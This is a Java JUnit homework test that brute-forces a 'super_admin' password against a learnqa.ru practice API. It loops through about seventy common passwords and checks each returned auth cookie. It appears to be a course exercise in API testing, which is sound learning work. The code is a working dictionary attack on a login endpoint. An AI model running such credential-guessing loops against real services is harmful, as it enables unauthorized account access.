import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;


public class lessonTwoHomeworkFive {
    @Test
    public void passwordChecker(){
        String login = "super_admin";
        HashMap<String, List<String>> passwordCheck = new HashMap<>();
        List<String> passwordList = new ArrayList<>();
        passwordList.add("password");
        passwordList.add("123456");
        passwordList.add("12345678");
        passwordList.add("qwerty");
        passwordList.add("abc123");
        passwordList.add("monkey");
        passwordList.add("1234567");
        passwordList.add("letmein");
        passwordList.add("trustno1");
        passwordList.add("dragon");
        passwordList.add("baseball");
        passwordList.add("111111");
        passwordList.add("iloveyou");
        passwordList.add("master");
        passwordList.add("sunshine");
        passwordList.add("ashley");
        passwordList.add("bailey");
        passwordList.add("passw0rd");
        passwordList.add("shadow");
        passwordList.add("123123");
        passwordList.add("654321");
        passwordList.add("superman");
        passwordList.add("qazwsx");
        passwordList.add("michael");
        passwordList.add("Football");

        passwordList.add("welcome");
        passwordList.add("football");
        passwordList.add("jesus");
        passwordList.add("ninja");
        passwordList.add("mustang");
        passwordList.add("password1");

        passwordList.add("123456789");
        passwordList.add("adobe123");
        passwordList.add("admin");
        passwordList.add("1234567890");
        passwordList.add("photoshop");
        passwordList.add("1234");
        passwordList.add("12345");
        passwordList.add("princess");
        passwordList.add("azerty");
        passwordList.add("000000");

        passwordList.add("access");
        passwordList.add("696969");
        passwordList.add("batman");

        passwordList.add("1qaz2wsx");
        passwordList.add("login");
        passwordList.add("qwertyuiop");
        passwordList.add("solo");
        passwordList.add("starwars");

        passwordList.add("121212");
        passwordList.add("flower");
        passwordList.add("hottie");
        passwordList.add("loveme");
        passwordList.add("zaq1zaq1");

        passwordList.add("hello");
        passwordList.add("freedom");
        passwordList.add("whatever");

        passwordList.add("!@#$%^&*");
        passwordList.add("charlie");
        passwordList.add("aa123456");
        passwordList.add("donald");
        passwordList.add("qwerty123");

        passwordList.add("1q2w3e4r");
        passwordList.add("555555");
        passwordList.add("lovely");
        passwordList.add("7777777");
        passwordList.add("888888");
        passwordList.add("123qwe");


        passwordCheck.put("password", passwordList);
        int i = 0;
        String rightCookieResponse = "";
    while(i  < passwordList.size()){
        Response responseAuthCookie = RestAssured
                .given()
                .queryParam("login", login)
                .queryParam("password",passwordList.get(i))
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();
        String authCookie = responseAuthCookie.getCookie("auth_cookie");
        System.out.println(passwordList.get(i));
        Response responseCheckAuthCookie = RestAssured
                .given()
                .cookie("auth_cookie",authCookie)
                .when()
                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();
        rightCookieResponse = responseCheckAuthCookie.asString();
        if(Objects.equals(rightCookieResponse, "You are authorized")){
            System.out.println("The password is "+passwordList.get(i));
            break;
        }
        else
        {
            i++;
        }

    }
        System.out.println("Password is not found");

    }
}
